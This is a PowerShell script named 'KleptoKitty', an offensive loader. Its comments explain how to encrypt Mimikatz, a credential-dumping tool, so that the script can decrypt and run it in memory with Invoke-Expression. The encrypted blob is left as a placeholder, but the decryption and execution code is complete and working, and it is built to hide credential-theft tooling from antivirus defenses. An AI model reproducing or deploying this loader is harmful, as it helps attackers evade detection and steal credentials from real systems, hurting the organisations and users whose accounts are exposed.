<#

     =^._.^=
    _(      )/  KleptoKitty

    How to build payload:

    1.  Encrypt CredentialAccess-Mimikatz by using helpers/Invoke-Rijndael.ps1
    2.  Copy Token to KleptoKitty, Token is concatenated from passphrase, salt, and init
#>

[CmdletBinding()]
Param (
    [String]
    $Token    
)

$passphrase = $Token.substring(0,32)
$salt = $Token.substring(32,32)
$init = $Token.substring(64,32)

Function Decrypt-String($Encrypted) { 
    $Encrypted = [Convert]::FromBase64String($Encrypted) 
    $r = new-Object System.Security.Cryptography.RijndaelManaged 
    $pass = [Text.Encoding]::UTF8.GetBytes($passphrase) 
    $salt = [Text.Encoding]::UTF8.GetBytes($salt) 
    $r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32)
    $r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15] 
    $d = $r.CreateDecryptor() 
    $ms = new-Object IO.MemoryStream @(,$Encrypted) 
    $cs = new-Object Security.Cryptography.CryptoStream $ms,$d,"Read" 
    $sr = new-Object IO.StreamReader $cs 
    Write-Output $sr.ReadToEnd() 
    $sr.Close() 
    $cs.Close() 
    $ms.Close() 
    $r.Clear() 
}

$Blob = "<insert encrypted string here>"
$Command = Decrypt-String($Blob)
Invoke-Expression -Command $Command
